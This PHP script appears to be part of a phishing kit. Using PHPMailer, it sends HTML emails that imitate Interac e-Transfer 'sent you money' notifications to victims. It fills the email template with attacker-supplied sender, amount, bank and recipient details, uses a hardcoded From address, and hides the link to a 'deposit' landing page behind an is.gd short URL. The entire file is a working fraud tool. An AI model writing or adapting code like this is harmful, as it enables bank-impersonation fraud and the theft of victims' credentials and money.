<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require("phpmailer/src/PHPMailer.php");
require("phpmailer/src/SMTP.php");
require("phpmailer/src/Exception.php");

function encryptParameters($params, $key) {
    $ivLength = openssl_cipher_iv_length('AES-256-CBC');
    $iv = openssl_random_pseudo_bytes($ivLength);
    $encrypted = openssl_encrypt($params, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    $encryptedMessage = $iv . $encrypted;
    $encryptedParams = base64_encode($encryptedMessage);
    return $encryptedParams;
}

function shortenURL($url) {
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

$key = 'YOUR_ENCRYPTION_KEY';
$params = 'username=value1&password=value2';
$encryptedParams = encryptParameters($params, $key);
$templateFile = 'template.html';
$emailTemplate = file_get_contents($templateFile);
$emailTemplate = str_replace('{{encryptedParams}}', $encryptedParams, $emailTemplate);
$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

// Calculate the date 30 days in the future and format it
$expireDate = date('F d, Y', strtotime('+30 days'));

// Create a placeholders array for replacement in the email template
$placeholders = array(
    '{{etransfer_interac_ca}}' => $short_url,
    '{{line}}' => $expireDate, 
    '{{username}}' => $_POST['username'],
    '{{photo_href}}' => $_POST['photo_href'],
    '{{bank}}' => $_POST['bank'],
    '{{amount}}' => $_POST['amount'],
    '{{photo_link}}' => $_POST['photo_link'],
    '{{link}}' => $_POST['link'],
    '{{EXPIRE}}' => $_POST['EXPIRE'],
    '{{expire}}' => $_POST['expire'],
    '{{link}}' => $_POST['link'],
    '{{sender_name}}' => $_POST['sender_name'],
    '{{memo}}' => $_POST['memo'],   
    '{{receivers_name}}' => $_POST['receivers_name'],
    '{{receivers_email}}' => $_POST['receivers_email']
);

$message = file_get_contents('template.html');
$message = str_replace(array_keys($placeholders), array_values($placeholders), $message);

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('andallard@mymts.net', $_POST['sender_name']);
$mail->AddAddress($_POST['receivers_email']);
$mail->Subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money.';
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

// Send the email
if (!$mail->send()) {
    echo 'Message could not be sent.';
    echo 'Mailer Error: ' . $mail->ErrorInfo;
} else {
    echo 'Message has been sent';
}

header("Location: ../../../start.php");
exit;
?>
